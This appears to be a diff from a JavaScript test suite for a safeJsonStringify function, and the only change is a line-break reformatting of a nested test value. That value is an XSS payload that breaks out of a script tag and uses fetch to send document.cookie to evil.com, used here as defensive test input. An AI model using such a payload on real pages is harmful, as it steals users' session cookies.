@@ -183,7 +183,8 @@ describe("safeJsonStringify", () => {
           b: {
             c: {
               d: {
-                value: '</script><script>fetch("https://evil.com/"+document.cookie)</script>',
+                value:
+                  '</script><script>fetch("https://evil.com/"+document.cookie)</script>',
               },
             },
           },
